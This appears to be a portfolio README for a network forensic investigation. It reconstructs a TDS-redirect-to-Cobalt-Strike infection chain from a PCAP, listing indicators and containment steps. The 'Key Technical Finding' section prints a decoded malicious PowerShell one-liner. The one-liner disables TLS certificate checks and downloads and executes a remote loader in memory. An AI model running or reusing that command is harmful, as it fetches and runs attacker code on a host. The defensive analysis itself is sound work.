# Network Forensic Investigation — 404TDS Redirect to Cobalt Strike

## Overview
Full network forensic investigation reconstructing a documented malware 
campaign entirely from a single PCAP capture. Traced the complete attack 
chain from initial TDS redirect through C2 beaconing, encoded PowerShell 
execution, payload retrieval, Cobalt Strike-like C2 traffic, lateral 
movement, and persistence.

## Case Summary

| Field | Value |
|-------|-------|
| Capture date/time (UTC) | 2023-11-06 16:09:13 to 17:33:30 |
| Duration | Approximately 1 hour 24 minutes |
| Packet count | 65,320 packets |
| Internal infected host | 10.11.7.120 / DESKTOP-A9KAOQ2 |
| Internal domain | northstartech.online |
| Overall assessment | Confirmed compromise with malware delivery, C2 beaconing, remote payload retrieval, persistence, and PowerShell/WinRM activity |

## Attack Chain Reconstructed
1. **Initial Access** — TDS redirect chain (truckjeepsuvparts.com → tradembs.com)
2. **C2 Beaconing** — Repeated HTTP POST beaconing to 170.130.55.46 every ~10 seconds, using a legacy MSIE/Trident User-Agent
3. **PowerShell Loader** — Decoded base64-encoded PowerShell revealing a `DownloadString` call to a remote loader URL
4. **Payload Retrieval** — RClient.dll fetched via direct HTTP GET from 170.130.165.37
5. **Cobalt Strike C2** — Identified jQuery-themed URI camouflage and a spoofed `code.jquery.com` Referer header, consistent with Cobalt Strike malleable C2 profiles
6. **Lateral Movement** — WinRM activity (TCP/5985) to internal host 10.11.7.17
7. **Persistence** — Scheduled task ("Adobe Update") and registry-based persistence under `HKCU:\Software\Classes\msslnooo`

## Methodology
Reviewed DNS lookups, HTTP request/response pairs, periodic connection 
patterns, decoded PowerShell/WinRM content, and payload retrieval strings. 
Findings are scoped strictly to what the network evidence directly 
supports — encrypted or encoded content is flagged as such rather than 
assumed.

## Key Technical Finding
Decoded the base64-encoded PowerShell command to reveal:
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString("https://170.130.55.117:8080/loader/LHMEsU0=");
```
This disables TLS certificate validation and downloads/executes a remote 
payload directly in memory — a fileless execution technique used to 
evade traditional antivirus detection.

## Impact Assessment
Full host compromise confirmed for the internal victim host, including 
C2 contact, payload retrieval, host/domain discovery, and persistence 
establishment.

## Containment Recommendations
- Immediate isolation and forensic imaging of the affected host
- Firewall/DNS blocking of all identified external IOCs
- Credential reset and account review for affected users
- Environment-wide hunt for matching jQuery-themed URI patterns and 
  encoded PowerShell execution

## Tools Used
Wireshark · TCP/HTTP Stream Analysis · CyberChef (Base64/UTF-16LE decoding) · Protocol Hierarchy & Conversation Statistics

## Full Report
See [full report](./report/PCAP_Forensic_Report_404TDS_CobaltStrike.pdf)
for complete findings, all 9 evidence screenshots, IOC tables, and the 
full investigation timeline.

## Skills Demonstrated
Network Traffic Analysis · C2 Identification · Cobalt Strike TTPs · 
PowerShell Deobfuscation · Malware Delivery Chain Reconstruction · 
Incident Timeline Reconstruction · IOC Extraction
